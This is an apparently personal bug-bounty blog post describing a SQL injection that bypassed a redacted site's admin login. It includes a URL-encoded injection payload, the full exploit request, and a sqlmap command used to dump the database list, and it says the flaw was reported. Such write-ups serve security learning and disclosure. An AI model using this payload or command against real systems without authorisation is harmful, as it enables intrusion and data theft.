# Introduction

Welcome to my very first blog post! I’m excited to share my bug bounty hunting journey with you. A year ago, I delved into the world of cybersecurity without any formal technology or IT training. Instead, I started my bug bounty adventure by self-teaching using resources like PortSwigger’s labs and educational content on YouTube. Today, I want to share a recent discovery where I found a vulnerability in a web application that allowed me to bypass its admin panel. I’ll explain how this vulnerability, known as SQL injection, works and how I used it to gain unauthorized access.

# Understanding SQL Injection

SQL injection is a type of attack where an attacker can manipulate an application’s SQL query by injecting malicious SQL code into user inputs. If the application doesn’t properly validate and sanitize these inputs, it can execute unintended SQL commands, leading to security breaches. Most often, you will see attackers/researchers injecting into vulnerable URL parameters (both in GET and POST requests), but sometimes, you can use SQL syntax/injections to bypass login screens. In this attack, I was able to demonstrate both of these attacks- bypassing the login panel, and also returning the database contents.

# Exploiting the Vulnerability

# Identifying the Vulnerable Login Page

When I visited `https://redacted.com/redacted/redacted_admin.xml`, I noticed a login prompt. When you enter your credentials and click login, the application sends a GET request with the credentials in the following way:

GET /redacted/redacted_admin.xml?id=admin&pswd=admin&uniqueId=0.5331820440279285 HTTP/1.1 2

After trying the basic `admin:admin` with no luck, and reading through the JS on the page, I decided to try an SQL injection. Testing some various payloads led me to the one that actually worked- I was able to inject into the `id` parameter using the payload:

-6513%27%20OR%20%28SELECT%20INSTR2%28NULL%2CNULL%29%20FROM%20DUAL%29%20IS%20NULL--%20SpSw

The full request was:

https://redacted.com/redacted/redacted_admin.xml?id=-6513%27%20OR%20%28SELECT%20INSTR2%28NULL%2CNULL%29%20FROM%20DUAL%29%20IS%20NULL--%20SpSw&pswd=admin&uniqueId=0.5331820440279285

After visiting this link, I was able to access the admin panel:

# Additional Exploitation with sqlmap

I also ran `sqlmap` on the raw request from Step 1, which helped me retrieve all the databases. This powerful tool can provide valuable insights into the structure of the database and its contents. The command I used:

`sqlmap -r request.txt --random-agent --dbs --proxy=http://127.0.0.1:8080 --force-ssl --batch --risk 3 --level 3`

Which returned the databases, as expected:

# Impact and Conclusion

This vulnerability, known as SQL injection, has the potential to be highly damaging. It allows attackers to bypass security measures and access sensitive information. It’s essential for developers to validate and sanitize user inputs to prevent such issues.

After discovering this vulnerability, I reported it to the website’s administrators, who, I hope, have taken the necessary steps to fix it. SQL injection is a common vulnerability on the web, and understanding how it works can help both security experts and website developers improve their practices.

Stay tuned to this channel, as I plan to share more write ups with you all in the near future.

Cheers!
